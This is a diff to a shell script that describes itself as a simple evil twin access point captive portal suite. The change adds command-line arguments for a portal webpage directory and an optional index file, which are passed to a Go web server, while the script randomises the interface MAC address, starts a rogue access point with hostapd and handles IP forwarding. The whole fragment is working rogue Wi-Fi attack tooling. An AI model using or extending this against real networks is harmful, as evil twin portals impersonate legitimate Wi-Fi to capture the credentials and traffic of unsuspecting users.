@@ -7,16 +7,17 @@ fi
 
 ARGC=$#
 
-if [ $ARGC -lt 2 ]
+if [ $ARGC -lt 4 ]
 then
     echo "A (very) simple evil twin access point captive portal suite"
-    echo "command: $0 <evil_interface> <internet_interafce> <ssid>"
+    echo "command: $0 <evil_interface> <internet_interafce> <ssid> <webpage_directory> [index_file]"
     echo -e "\tdepends upon macchanger, hostapd, dnsmasq, iptables, go"
     exit 1
 fi
 
 EVIL_IFACE=$1
 GOOD_IFACE=$2
+DIR=$4
 
 macchanger -r $EVIL_IFACE
 
@@ -62,9 +63,13 @@ fi
 # Create AP, WPA2 mode
 hostapd hostapd.conf &
 
-# Oh apache and friends, how much I hate thou
-go run gobweb.go
-#& go run gobwebtls.go
+if [[ -n "$5" ]]
+then
+    go run gobweb.go "$4" "$5"
+else
+    go run gobweb.go "$4"
+fi
+
 killall dnsmasq
 
 sysctl net.ipv4.ip_forward=0
